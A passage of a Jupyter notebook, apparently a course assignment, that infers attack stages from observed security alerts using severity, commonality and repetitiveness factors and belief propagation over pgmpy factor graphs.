       " 'f5': [0.5533333333333333,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.44666666666666666,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0,\n",
       "  0.0],\n",
       " 'f6': [0.875, 0.0, 0.0, 0.0, 0.0, 0.125, 0.0, 0.0, 0.0, 0.0, 0.0],\n",
       " 'f7': [0.02, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.98, 0.0, 0.0],\n",
       " 'f8': [0.02, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.98, 0.0, 0.0],\n",
       " 'f9': [0.02, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.98, 0.0, 0.0]}"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "observed_events={'E1':'Scan','E2':'Login', 'E3': 'Sensitive_URI','E4': 'Sensitive_URI','E5': 'Sensitive_URI',\n",
    "                 'E6':'New_Kernel_Module', 'E7':'DNS_Tunneling','E8':'DNS_Tunneling','E9':'DNS_Tunneling'}\n",
    "states=['benign','discovery','access','lateral_movement','privilege_escalation','persistence','defense_evasion','collection'\n",
    "       ,'exfiltration','command_and_control','vulnerable_code_execution']\n",
    "counter=0\n",
    "flag=0\n",
    "severity_factor_functions={}\n",
    "severity_factor_functions['f1']=[]\n",
    "severity_factor_functions['f2']=[]\n",
    "severity_factor_functions['f3']=[]\n",
    "severity_factor_functions['f4']=[]\n",
    "severity_factor_functions['f5']=[]\n",
    "severity_factor_functions['f6']=[]\n",
    "severity_factor_functions['f7']=[]\n",
    "severity_factor_functions['f8']=[]\n",
    "severity_factor_functions['f9']=[]\n",
    "factors=['f1','f2','f3','f4','f5','f6','f7','f8','f9']\n",
    "severity_factor(observed_events,states,factors,severity_factor_functions)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>state_name</th>\n",
       "      <th>f1</th>\n",
       "      <th>f2</th>\n",
       "      <th>f3</th>\n",
       "      <th>f4</th>\n",
       "      <th>f5</th>\n",
       "      <th>f6</th>\n",
       "      <th>f7</th>\n",
       "      <th>f8</th>\n",
       "      <th>f9</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>benign</td>\n",
       "      <td>0.936</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.553333</td>\n",
       "      <td>0.553333</td>\n",
       "      <td>0.553333</td>\n",
       "      <td>0.875</td>\n",
       "      <td>0.02</td>\n",
       "      <td>0.02</td>\n",
       "      <td>0.02</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>discovery</td>\n",
       "      <td>0.064</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>access</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>lateral_movement</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>privilege_escalation</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.446667</td>\n",
       "      <td>0.446667</td>\n",
       "      <td>0.446667</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>persistence</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.125</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>defense_evasion</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>collection</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>exfiltration</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.98</td>\n",
       "      <td>0.98</td>\n",
       "      <td>0.98</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>command_and_control</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>vulnerable_code_execution</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                   state_name     f1   f2        f3        f4        f5  \\\n",
       "0                      benign  0.936  1.0  0.553333  0.553333  0.553333   \n",
       "1                   discovery  0.064  0.0  0.000000  0.000000  0.000000   \n",
       "2                      access  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "3            lateral_movement  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "4        privilege_escalation  0.000  0.0  0.446667  0.446667  0.446667   \n",
       "5                 persistence  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "6             defense_evasion  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "7                  collection  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "8                exfiltration  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "9         command_and_control  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "10  vulnerable_code_execution  0.000  0.0  0.000000  0.000000  0.000000   \n",
       "\n",
       "       f6    f7    f8    f9  \n",
       "0   0.875  0.02  0.02  0.02  \n",
       "1   0.000  0.00  0.00  0.00  \n",
       "2   0.000  0.00  0.00  0.00  \n",
       "3   0.000  0.00  0.00  0.00  \n",
       "4   0.000  0.00  0.00  0.00  \n",
       "5   0.125  0.00  0.00  0.00  \n",
       "6   0.000  0.00  0.00  0.00  \n",
       "7   0.000  0.00  0.00  0.00  \n",
       "8   0.000  0.98  0.98  0.98  \n",
       "9   0.000  0.00  0.00  0.00  \n",
       "10  0.000  0.00  0.00  0.00  "
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_factor=pd.DataFrame(severity_factor_functions)\n",
    "df_factor['state_name']=states\n",
    "df_factor.set_index('state_name',inplace=True)\n",
    "df_factor.reset_index(inplace=True)\n",
    "df_factor"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Subtask 3.1 - construct the commonality factor function c and repetitiveness factor function r </b>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Commonality Factor Function </b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import operator\n",
    "import os\n",
    "os.chdir(\"D:\\CS 498\\mp3\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The most commonly occuring sequence is Scan Sensitive_URI New_Kernel_Module and it\"s corrosponding probability is 0.07145409074669525\n"
     ]
    }
   ],
   "source": [
    "#### Main code\n",
    "sequence=[]\n",
    "with open('attack_sequences.txt','r') as f:\n",
    "    counter=0\n",
    "    while True:\n",
    "        content=f.readline()\n",
    "        if not content:\n",
    "            break\n",
    "        line=content.split()\n",
    "        sequence.append(-99)\n",
    "        for num in line:\n",
    "            sequence.append(num)\n",
    "possible_sequences={}\n",
    "sequence\n",
    "dante=0\n",
    "for i,j in enumerate(sequence):\n",
    "    possible_sequences[dante]=[]\n",
    "    try:\n",
    "        if j != -99 and j != -99 and j != -99:\n",
    "            if sequence[i+1] !=-99 and sequence[i+2] !=-99:\n",
    "                possible_sequences[dante].append(sequence[i])\n",
    "                possible_sequences[dante].append(sequence[i+1])\n",
    "                possible_sequences[dante].append(sequence[i+2])\n",
    "                dante+=1\n",
    "    except:\n",
    "        continue\n",
    "    \n",
    "theta={}\n",
    "for i,num in enumerate(possible_sequences.values()):\n",
    "    theta[i]=[]\n",
    "    theta[i].append(num)\n",
    "sequence_df=pd.DataFrame(theta).T\n",
    "\n",
    "def numb(x):\n",
    "    try:  \n",
    "        y=x[0] + \" \" + x[1] + \" \" + x[2]\n",
    "    except:\n",
    "        y='Null'\n",
    "    return y\n",
    "\n",
    "sequence_df['sequence']=sequence_df[0].apply(lambda x:numb(x))\n",
    "sequence_df\n",
    "d={}\n",
    "for i in sequence_df['sequence'].unique():\n",
    "    d[i]=0\n",
    "    \n",
    "with open('attack_sequences.txt','r') as f:\n",
    "    counter=0\n",
    "    while True:\n",
    "        content=f.readline()\n",
    "        if not content:\n",
    "            break\n",
    "#         print(content)\n",
    "        for num in sequence_df['sequence'].unique():\n",
    "            if num in content:\n",
    "                d[num]+=content.count(num)\n",
    "k={}\n",
    "for i,j in d.items():\n",
    "    k[i]= j/len(sequence_df)\n",
    "print(f'The most commonly occuring sequence is {max(k.items(), key=operator.itemgetter(1))[0]} and it\"s corrosponding probability is {k[\"Scan Sensitive_URI New_Kernel_Module\"]}')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Repetitiveness Factor Function </b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The most commonly occuring sequence is Sensitive_URI Sensitive_URI Sensitive_URI and it\"s corrosponding probability is 0.06645230439442658\n"
     ]
    }
   ],
   "source": [
    "#### Main code\n",
    "sequence=[]\n",
    "with open('attack_sequences.txt','r') as f:\n",
    "    counter=0\n",
    "    while True:\n",
    "        content=f.readline()\n",
    "        if not content:\n",
    "            break\n",
    "        line=content.split()\n",
    "        sequence.append(-99)\n",
    "        for num in line:\n",
    "            sequence.append(num)\n",
    "possible_sequences={}\n",
    "sequence\n",
    "dante=0\n",
    "for i,j in enumerate(sequence):\n",
    "    possible_sequences[dante]=[]\n",
    "    try:\n",
    "        if j != -99 and j != -99 and j != -99:\n",
    "            if sequence[i+1] !=-99 and sequence[i+2] !=-99:\n",
    "                possible_sequences[dante].append(sequence[i])\n",
    "                possible_sequences[dante].append(sequence[i+1])\n",
    "                possible_sequences[dante].append(sequence[i+2])\n",
    "                dante+=1\n",
    "    except:\n",
    "        continue\n",
    "    \n",
    "theta={}\n",
    "for i,num in enumerate(possible_sequences.values()):\n",
    "    theta[i]=[]\n",
    "    theta[i].append(num)\n",
    "sequence_df=pd.DataFrame(theta).T\n",
    "\n",
    "def numb(x):\n",
    "    try:  \n",
    "        y=x[0] + \" \" + x[1] + \" \" + x[2]\n",
    "    except:\n",
    "        y='Null'\n",
    "    return y\n",
    "\n",
    "sequence_df['sequence']=sequence_df[0].apply(lambda x:numb(x))\n",
    "sequence_df\n",
    "d={}\n",
    "for i in sequence_df['sequence'].unique():\n",
    "    d[i]=0\n",
    "    \n",
    "with open('attack_sequences.txt','r') as f:\n",
    "    counter=0\n",
    "    while True:\n",
    "        content=f.readline()\n",
    "        if not content:\n",
    "            break\n",
    "#         print(content)\n",
    "        for num in sequence_df['sequence'].unique():\n",
    "            line=content.split()\n",
    "            for i in range(len(line)-2):\n",
    "                a=\" \".join(line[i:i+3])\n",
    "                if a==num:\n",
    "                    d[num]+=1\n",
    "                else:\n",
    "                    pass                \n",
    "k={}\n",
    "for i,j in d.items():\n",
    "    k[i]= j/len(sequence_df)\n",
    "repetitive={}\n",
    "for x,y in k.items():\n",
    "    try:\n",
    "        if x.split()[0] == x.split()[1] == x.split()[2]:\n",
    "            repetitive[x]=y\n",
    "    except:\n",
    "        continue\n",
    "print(f'The most commonly occuring sequence is {max(repetitive.items(), key=operator.itemgetter(1))[0]} and it\"s corrosponding probability is {k[\"Sensitive_URI Sensitive_URI Sensitive_URI\"]}')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 3.3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We create sub factor graphs as some of the nodes are disconnected"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Sub factor graph1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E4: 100%|███████████████████████████████████████████████████████████████████| 5/5 [00:00<00:00,  5.23it/s]\n"
     ]
    }
   ],
   "source": [
    "f_1 = DiscreteFactor(variables=['S1','E1'],cardinality=[11,1],values=np.array(df_factor['f1']))\n",
    "f_2 = DiscreteFactor(variables=['S2','E2'],cardinality=[11,1],values=np.array(df_factor['f2']))\n",
    "f_3 = DiscreteFactor(variables=['S3','E3'],cardinality=[11,1],values=np.array(df_factor['f3']))\n",
    "f_4 = DiscreteFactor(variables=['S4','E4'],cardinality=[11,1],values=np.array(df_factor['f4']))\n",
    "f_5 = DiscreteFactor(variables=['S5','E5'],cardinality=[11,1],values=np.array(df_factor['f5']))\n",
    "f_6 = DiscreteFactor(variables=['S6','E6'],cardinality=[11,1],values=np.array(df_factor['f6']))\n",
    "f_7 = DiscreteFactor(variables=['S7','E7'],cardinality=[11,1],values=np.array(df_factor['f7']))\n",
    "f_8 = DiscreteFactor(variables=['S8','E8'],cardinality=[11,1],values=np.array(df_factor['f8']))\n",
    "f_9 = DiscreteFactor(variables=['S9','E9'],cardinality=[11,1],values=np.array(df_factor['f9']))\n",
    "\n",
    "c= DiscreteFactor(variables=['S6','E1','E3','E6'],cardinality=[11,1,1,1],values=[0,0,0,0,0,0.0714,0,0,0,0,0])\n",
    "r= DiscreteFactor(variables=['S5','E3','E4','E5'],cardinality=[11,1,1,1],values=[0,0,0,0,0.0664,0,0,0,0,0,0])\n",
    "\n",
    "G1 = FactorGraph() ## Create FactorGraph object\n",
    "G1.add_nodes_from(['E1','E3','E4','E5','E6','S1','S3','S4','S5','S6'])  ## Add random variables \n",
    "G1.add_factors(f_1,f_3,f_4,f_5,f_6,r,c)    ## Add factor functions\n",
    "\n",
    "\n",
    "G1.add_edges_from([('S1',f_1),('E1',f_1),('S3',f_3),('E3',f_3),('S6',f_6),('E6',f_6)\n",
    "                   ,('S4',f_4),('E4',f_4),('S5',f_5),('E5',f_5),('E1',c),('E3',c),('E6',c),('S6',c),\n",
    "                    ('E3',r),('E4',r),('E5',r),('S5',r)])\n",
    "\n",
    "\n",
    "bp1 = BeliefPropagation(G1)\n",
    "margin=bp1.query(variables=['S1','S3','S4','S5','S6'],joint=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| S1     |   phi(S1) |\n",
      "+========+===========+\n",
      "| S1(0)  |    0.9360 |\n",
      "+--------+-----------+\n",
      "| S1(1)  |    0.0640 |\n",
      "+--------+-----------+\n",
      "| S1(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S1(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| S3     |   phi(S3) |\n",
      "+========+===========+\n",
      "| S3(0)  |    0.5533 |\n",
      "+--------+-----------+\n",
      "| S3(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(4)  |    0.4467 |\n",
      "+--------+-----------+\n",
      "| S3(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S3(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| S4     |   phi(S4) |\n",
      "+========+===========+\n",
      "| S4(0)  |    0.5533 |\n",
      "+--------+-----------+\n",
      "| S4(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(4)  |    0.4467 |\n",
      "+--------+-----------+\n",
      "| S4(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S4(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| S5     |   phi(S5) |\n",
      "+========+===========+\n",
      "| S5(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(4)  |    1.0000 |\n",
      "+--------+-----------+\n",
      "| S5(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S5(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| S6     |   phi(S6) |\n",
      "+========+===========+\n",
      "| S6(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(5)  |    1.0000 |\n",
      "+--------+-----------+\n",
      "| S6(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S6(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    }
   ],
   "source": [
    "print(margin['S1'])\n",
    "print(margin['S3'])\n",
    "print(margin['S4'])\n",
    "print(margin['S5'])\n",
    "print(margin['S6'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Sub factor graph 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E2: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 338.63it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| S2     |   phi(S2) |\n",
      "+========+===========+\n",
      "| S2(0)  |    1.0000 |\n",
      "+--------+-----------+\n",
      "| S2(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S2(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "G2 = FactorGraph() ## Create FactorGraph object\n",
    "G2.add_nodes_from(['S2','E2'])  ## Add random variables \n",
    "G2.add_factors(f_2)     ## Add factor functions\n",
    "G2.add_edges_from([('S2',f_2),('E2',f_2)])\n",
    "\n",
    "bp2 = BeliefPropagation(G2)\n",
    "margin=bp2.query(variables=['S2'],joint=False)\n",
    "print(margin['S2'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Sub factor graph 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E7: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 420.57it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| S7     |   phi(S7) |\n",
      "+========+===========+\n",
      "| S7(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| S7(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| S7(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S7(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "G3 = FactorGraph() ## Create FactorGraph object\n",
    "G3.add_nodes_from(['S7','E7'])  ## Add random variables \n",
    "G3.add_factors(f_7)     ## Add factor functions\n",
    "G3.add_edges_from([('S7',f_7),('E7',f_7)])\n",
    "\n",
    "bp2 = BeliefPropagation(G3)\n",
    "margin=bp2.query(variables=['S7'],joint=False)\n",
    "print(margin['S7'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Sub factor graph 4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E8: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 252.73it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| S8     |   phi(S8) |\n",
      "+========+===========+\n",
      "| S8(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| S8(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| S8(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S8(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "G4 = FactorGraph() ## Create FactorGraph object\n",
    "G4.add_nodes_from(['S8','E8'])  ## Add random variables \n",
    "G4.add_factors(f_8)     ## Add factor functions\n",
    "G4.add_edges_from([('S8',f_8),('E8',f_8)])\n",
    "\n",
    "bp = BeliefPropagation(G4)\n",
    "margin=bp.query(variables=['S8'],joint=False)\n",
    "print(margin['S8'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Sub factor graph 5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E9: 100%|██████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 248.46it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| S9     |   phi(S9) |\n",
      "+========+===========+\n",
      "| S9(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| S9(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| S9(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| S9(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "G5 = FactorGraph() ## Create FactorGraph object\n",
    "G5.add_nodes_from(['S9','E9'])  ## Add random variables \n",
    "G5.add_factors(f_9)     ## Add factor functions\n",
    "G5.add_edges_from([('S9',f_9),('E9',f_9)])\n",
    "\n",
    "bp = BeliefPropagation(G5)\n",
    "margin=bp.query(variables=['S9'],joint=False)\n",
    "print(margin['S9'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "S1 - Benign <br>\n",
    "S2 - Benign <br>\n",
    "S3 - Benign <br>\n",
    "S4 - Benign <br>\n",
    "S5 - Privelege Escalation <br>\n",
    "S6 - Persistence <br>\n",
    "S7 - Exfiltration <br>\n",
    "S8 - Exfiltration <br>\n",
    "S9 - Exfiltration <br>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Subtask 3.7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
